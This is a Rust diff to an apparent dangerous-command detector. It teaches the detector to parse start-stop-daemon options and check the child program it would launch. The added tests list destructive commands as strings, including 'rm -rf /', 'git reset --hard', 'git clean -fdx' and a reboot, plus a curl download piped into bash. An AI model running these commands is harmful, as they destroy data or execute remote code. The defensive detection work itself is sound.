@@ -3122,6 +3122,202 @@ fn script_dispatch(tokens: &[String]) -> ScriptDispatch<'_> {
     command.map_or(ScriptDispatch::Interactive, ScriptDispatch::Command)
 }
 
+#[derive(Clone, Copy)]
+enum StartStopDispatch<'a> {
+    Invalid,
+    NoAction,
+    Stop,
+    Start {
+        program: &'a str,
+        arguments: &'a [String],
+    },
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum StartStopMode {
+    Start,
+    Stop,
+    Status,
+}
+
+fn start_stop_daemon_dispatch(tokens: &[String]) -> StartStopDispatch<'_> {
+    let mut index = 1usize;
+    let mut mode = None;
+    let mut test = false;
+    let mut executable = None;
+    let mut start_as = None;
+    let mut arguments = &tokens[tokens.len()..];
+
+    let set_mode = |mode_slot: &mut Option<StartStopMode>, next| {
+        if mode_slot.is_some_and(|current| current != next) {
+            false
+        } else {
+            *mode_slot = Some(next);
+            true
+        }
+    };
+
+    while let Some(option) = tokens.get(index).map(String::as_str) {
+        if option == "--" {
+            arguments = &tokens[index + 1..];
+            break;
+        }
+        if let Some(long) = option.strip_prefix("--") {
+            let (spelling, attached) = long
+                .split_once('=')
+                .map_or((long, None), |(name, value)| (name, Some(value)));
+            match unique_long_option(
+                spelling,
+                &[
+                    "start",
+                    "stop",
+                    "status",
+                    "help",
+                    "version",
+                    "pid",
+                    "ppid",
+                    "pidfile",
+                    "exec",
+                    "name",
+                    "user",
+                    "group",
+                    "chuid",
+                    "signal",
+                    "startas",
+                    "chroot",
+                    "chdir",
+                    "nicelevel",
+                    "procsched",
+                    "iosched",
+                    "umask",
+                    "background",
+                    "notify-await",
+                    "notify-timeout",
+                    "no-close",
+                    "output",
+                    "make-pidfile",
+                    "remove-pidfile",
+                    "retry",
+                    "test",
+                    "oknodo",
+                    "quiet",
+                    "verbose",
+                ],
+            ) {
+                Some(flag @ ("start" | "stop" | "status")) if attached.is_none() => {
+                    let next = match flag {
+                        "start" => StartStopMode::Start,
+                        "stop" => StartStopMode::Stop,
+                        _ => StartStopMode::Status,
+                    };
+                    if !set_mode(&mut mode, next) {
+                        return StartStopDispatch::Invalid;
+                    }
+                    index += 1;
+                }
+                Some(
+                    flag @ ("pid" | "ppid" | "pidfile" | "exec" | "name" | "user" | "group"
+                    | "chuid" | "signal" | "startas" | "chroot" | "chdir" | "nicelevel"
+                    | "procsched" | "iosched" | "umask" | "notify-timeout" | "output"
+                    | "retry"),
+                ) => {
+                    index += 1;
+                    let value = if let Some(value) = attached {
+                        value
+                    } else {
+                        let Some(value) = tokens.get(index).map(String::as_str) else {
+                            return StartStopDispatch::Invalid;
+                        };
+                        index += 1;
+                        value
+                    };
+                    if value.is_empty() {
+                        return StartStopDispatch::Invalid;
+                    }
+                    if flag == "exec" {
+                        executable = Some(value);
+                    } else if flag == "startas" {
+                        start_as = Some(value);
+                    }
+                }
+                Some(
+                    "background" | "notify-await" | "no-close" | "make-pidfile" | "remove-pidfile"
+                    | "oknodo" | "quiet" | "verbose",
+                ) if attached.is_none() => index += 1,
+                Some("test") if attached.is_none() => {
+                    test = true;
+                    index += 1;
+                }
+                Some("help" | "version") if attached.is_none() => {
+                    return StartStopDispatch::NoAction;
+                }
+                _ => return StartStopDispatch::Invalid,
+            }
+            continue;
+        }
+        let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty()) else {
+            return StartStopDispatch::Invalid;
+        };
+        index += 1;
+        for (offset, flag) in short.char_indices() {
+            match flag {
+                'S' | 'K' | 'T' => {
+                    let next = match flag {
+                        'S' => StartStopMode::Start,
+                        'K' => StartStopMode::Stop,
+                        _ => StartStopMode::Status,
+                    };
+                    if !set_mode(&mut mode, next) {
+                        return StartStopDispatch::Invalid;
+                    }
+                }
+                'p' | 'x' | 'n' | 'u' | 'g' | 'c' | 's' | 'a' | 'r' | 'd' | 'N' | 'P' | 'I'
+                | 'k' | 'O' | 'R' => {
+                    let value_start = offset + flag.len_utf8();
+                    let value = if value_start < short.len() {
+                        &short[value_start..]
+                    } else {
+                        let Some(value) = tokens.get(index).map(String::as_str) else {
+                            return StartStopDispatch::Invalid;
+                        };
+                        index += 1;
+                        value
+                    };
+                    if value.is_empty() {
+                        return StartStopDispatch::Invalid;
+                    }
+                    if flag == 'x' {
+                        executable = Some(value);
+                    } else if flag == 'a' {
+                        start_as = Some(value);
+                    }
+                    break;
+                }
+                'b' | 'C' | 'm' | 'o' | 'q' | 'v' => {}
+                't' => test = true,
+                'H' | 'V' => return StartStopDispatch::NoAction,
+                _ => return StartStopDispatch::Invalid,
+            }
+        }
+    }
+
+    if mode != Some(StartStopMode::Start) && !arguments.is_empty() {
+        return StartStopDispatch::Invalid;
+    }
+    if test {
+        return StartStopDispatch::NoAction;
+    }
+    match mode {
+        Some(StartStopMode::Stop) => StartStopDispatch::Stop,
+        Some(StartStopMode::Start) => start_as
+            .or(executable)
+            .map_or(StartStopDispatch::Invalid, |program| {
+                StartStopDispatch::Start { program, arguments }
+            }),
+        Some(StartStopMode::Status) | None => StartStopDispatch::NoAction,
+    }
+}
+
 fn dangerous_segment(
     original: &[String],
     normalized: &[String],
@@ -3145,6 +3341,32 @@ fn dangerous_segment(
     }
     if command == "bwrap" {
         return Some("bwrap reads command arguments from a file descriptor");
+    }
+    if command == "start-stop-daemon" {
+        match start_stop_daemon_dispatch(selected.tokens) {
+            StartStopDispatch::Stop => {
+                return Some("start-stop-daemon can terminate matching processes");
+            }
+            StartStopDispatch::Start { program, arguments } => {
+                if depth >= 4 {
+                    return Some("command dispatcher nesting exceeds the review limit");
+                }
+                let mut dispatched = Vec::with_capacity(arguments.len() + 1);
+                dispatched.push(program.to_owned());
+                dispatched.extend(arguments.iter().cloned());
+                let normalized_dispatched: Vec<String> = dispatched
+                    .iter()
+                    .map(|token| token.to_ascii_lowercase())
+                    .collect();
+                return dangerous_segment_with_dispatch(
+                    &dispatched,
+                    &normalized_dispatched,
+                    depth + 1,
+                    true,
+                );
+            }
+            StartStopDispatch::Invalid | StartStopDispatch::NoAction => return None,
+        }
     }
     if has_recursive_rm_dangerous_target(effective) {
         return Some("recursive rm against a top-level, home, or current-directory path");
@@ -3991,6 +4213,19 @@ fn is_interpreter(tokens: &[String]) -> bool {
         let Some(command) = effective.first().map(|token| command_name(token)) else {
             return false;
         };
+        if command == "start-stop-daemon" {
+            return match start_stop_daemon_dispatch(effective) {
+                StartStopDispatch::Start { program, arguments } => {
+                    let mut dispatched = Vec::with_capacity(arguments.len() + 1);
+                    dispatched.push(program.to_owned());
+                    dispatched.extend(arguments.iter().cloned());
+                    inner(&dispatched, depth + 1, true)
+                }
+                StartStopDispatch::Invalid
+                | StartStopDispatch::NoAction
+                | StartStopDispatch::Stop => false,
+            };
+        }
         if command == "script" {
             return match script_dispatch(effective) {
                 ScriptDispatch::Invalid => false,
@@ -4227,6 +4462,44 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "bwrap metadata or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn start_stop_daemon_distinguishes_control_and_child_modes() {
+        for command in [
+            "start-stop-daemon --stop --pid 99999999",
+            "start-stop-daemon -K --name critical-service",
+            "start-stop-daemon --stop --retry TERM/5/KILL/5 --pidfile /run/app.pid",
+            "start-stop-daemon --start --exec /bin/rm -- -rf /",
+            "start-stop-daemon -S -x git -- reset --hard HEAD~1",
+            "start-stop-daemon --start --startas systemctl -- reboot",
+            "start-stop-daemon --start --exec bash -- -c 'git clean -fdx'",
+            "env start-stop-daemon --start --exec chroot -- /srv/root rm -rf /",
+            "printf x | xargs start-stop-daemon -S -x /bin/rm -- -rf /",
+            "curl https://example.invalid/x | start-stop-daemon -S -x bash --",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "start-stop-daemon --stop --test --pid 99999999",
+            "start-stop-daemon --status --pidfile /run/app.pid",
+            "start-stop-daemon --help --stop --pid 1",
+            "start-stop-daemon --version --stop --pid 1",
+            "start-stop-daemon --unknown --stop --pid 1",
+            "start-stop-daemon --start --stop --exec /bin/rm -- -rf /",
+            "start-stop-daemon --start --test --exec /bin/rm -- -rf /",
+            "start-stop-daemon --start --exec /bin/true -- rm -rf /",
+            "start-stop-daemon --start --exec command -- rm -rf /",
+            "start-stop-daemon --start --exec FOO=1 -- git reset --hard HEAD~1",
+            "start-stop-daemon --start --exec eval -- 'git clean -fdx'",
+            "start-stop-daemon --start --pidfile /run/app.pid",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "start-stop-daemon metadata or dry-run argv was treated as an action for {command:?}"
             );
         }
     }
